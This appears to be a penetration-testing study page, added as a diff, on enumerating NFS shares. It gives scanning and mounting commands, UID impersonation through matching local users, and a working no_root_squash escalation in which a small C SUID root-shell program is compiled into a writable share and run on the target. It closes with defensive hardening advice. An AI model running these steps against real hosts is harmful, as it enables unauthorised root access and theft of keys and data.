@@ -1,0 +1,136 @@
+---
+title: "NFS Enumeration (Network File System)"
+---
+
+<Info>
+**What it is**
+
+NFS is the **Unix/Linux equivalent of SMB** — a protocol for sharing directories ("exports") across the network so a remote machine can mount them as if they were local. It listens on **TCP 2049** (with helper services on 111). It matters to an attacker because exports are frequently world-readable, and a specific misconfiguration (`no_root_squash`) turns file access into **root-level privilege escalation**.
+</Info>
+
+---
+
+## How NFS actually works
+
+A server **exports** one or more directories — listed in `/etc/exports` — and clients **mount** them over the network into their own filesystem. Once mounted, reading and writing the remote files looks exactly like working with local files.
+
+Two pieces of plumbing matter:
+
+- **The mount/portmapper helper (port 111).** Historically NFS relied on `rpcbind`/`portmapper` on TCP/UDP **111** plus `mountd` to negotiate which port the actual NFS service used. Modern NFSv4 consolidates everything onto **2049**, but you'll still see 111 on older setups, and it's what `rpcinfo` queries.
+- **Identity is just numeric UID/GID.** This is the crucial concept. NFS (v3 especially) doesn't authenticate *users* — it trusts whatever **UID/GID** the client claims. If a file on the server is owned by UID 1000, then *your* local user with UID 1000 can read/write it, regardless of who that user actually is. There's no password exchange; the server assumes the client has already authenticated its own users.
+
+<Warning>
+**Why "identity = UID number" is the whole vulnerability**
+
+Because the server trusts the client's UID, you control the UID on *your* box. If you know a file is owned by UID 1005, you create a local user with `useradd -u 1005` (or just `sudo`, which runs as UID 0), mount the share, and you now have that user's access to the files. The server never verifies you're really that person.
+</Warning>
+
+### Squashing: the safety setting (and the bug)
+
+To stop a remote **root** (UID 0) from automatically having root over exported files, NFS has **squashing**:
+
+- **`root_squash`** (the safe default) — remote UID 0 is downgraded ("squashed") to the unprivileged `nobody` user. Your root can't act as the server's root.
+- **`no_root_squash`** (the dangerous misconfig) — remote UID 0 is honored **as real root** on the share. If this is set, you mount the share *as your local root*, and you can read/write the server's files **as root** — including dropping a root-owned SUID binary that gives you a root shell on the host. This is the headline NFS privesc.
+
+---
+
+## How to spot it on a scan
+
+```bash
+nmap -p111,2049 -sV -sC <IP>                          # detect NFS + rpc/mount info
+nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <IP>   # list exports + contents
+rpcinfo -p <IP>                                        # what RPC services/ports are registered
+```
+
+---
+
+## Enumeration workflow
+
+### 1. List the exports
+
+`showmount` asks the server which directories it exports and to whom:
+
+```bash
+showmount -e <IP>          # -e = list exports; shows each share and its allowed clients
+```
+
+An entry allowed to `*` (everyone) is open to you.
+
+### 2. Mount and browse
+
+```bash
+mkdir /tmp/nfs
+sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock   # mount the share locally
+sudo ls -la /tmp/nfs                                   # browse with sudo (UID issues, see below)
+sudo cat /tmp/nfs/<file>
+```
+
+<Tip>
+**Use `sudo`, and watch the permissions**
+
+Exported files often show owners like `nobody` or a specific UID with `drwx------`. Your normal user's UID won't match, so listing/reading fails — `sudo` (UID 0) sidesteps it for browsing. If a file is owned by a *specific* UID you need to act as, create a matching local user (`sudo useradd -u <UID> tempuser`) and `su` to it.
+</Tip>
+
+### 3. Clean up
+
+```bash
+sudo umount /tmp/nfs
+sudo umount -f /tmp/nfs    # force, if it won't release
+sudo umount -l /tmp/nfs    # lazy unmount — use if the mount hangs
+```
+
+<Warning>
+**Always unmount when the target goes down**
+
+A **stale NFS mount** (target rebooted/offline) will *freeze* any command that touches that directory — `ls`, tab-completion, even your shell. Lazy-unmount (`-l`) to recover.
+</Warning>
+
+---
+
+## Privilege escalation via `no_root_squash`
+
+This is the attack to remember. If an export is mounted writable **and** the server has `no_root_squash`, you can write a **root-owned SUID binary** into the share from your machine; because you're root locally and root isn't squashed, the file lands owned by root on the server. When you then execute it *on the target* (e.g. via an existing low-priv shell), the SUID bit gives you root.
+
+```bash
+# On YOUR box (as root), inside the writable mounted share:
+cat > /tmp/nfs/shell.c <<'EOF'
+int main(void){ setuid(0); setgid(0); system("/bin/bash"); return 0; }
+EOF
+gcc /tmp/nfs/shell.c -o /tmp/nfs/rootshell      # compiles into the share as root
+chmod u+s /tmp/nfs/rootshell                     # set the SUID bit (stays because no_root_squash)
+
+# On the TARGET (via a low-priv shell on the box), in the same directory:
+./rootshell                                      # runs as root → root shell
+```
+
+The reason it works: the SUID bit means "run this as the file's owner." The owner is root (because root wasn't squashed when you wrote it), so executing it on the host yields a root shell. See **[Linux_PrivEsc_Checklist](/privesc/linux-privesc-checklist)** for where this fits among other Linux escalation paths.
+
+---
+
+## What to look for / loot
+
+- **SSH keys and configs** in mounted home directories (`.ssh/id_rsa`).
+- **Backups, source, database dumps** sitting in exported data directories.
+- **Writable + `no_root_squash`** → the SUID root-shell escalation above.
+- **UID-restricted files** → recreate the owning UID locally to read them.
+
+---
+
+## Defensive notes (for the report)
+
+- Keep **`root_squash`** on (never use `no_root_squash`), and add `all_squash` where appropriate.
+- Restrict exports to **specific client IPs/subnets** in `/etc/exports`, never `*`.
+- Export **read-only** unless write is genuinely needed, and use NFSv4 with Kerberos (`sec=krb5`) for real authentication instead of bare UID trust.
+- Firewall ports 111 and 2049 so only authorized clients can reach them.
+
+---
+
+## Quick reference
+
+| Item | Value |
+|---|---|
+| Ports | TCP **2049** (NFS), **111** (rpcbind/portmapper, legacy) |
+| Identity model | Trusts the client's **UID/GID** — no user authentication (v3) |
+| First move | `showmount -e <IP>` → `sudo mount -t nfs <IP>:/<export> /tmp/nfs` |
+| Killer misconfig | **`no_root_squash`** → write root SUID binary → root shell |
+| Gotchas | `sudo` to browse; **always unmount** to avoid stale-mount freezes |
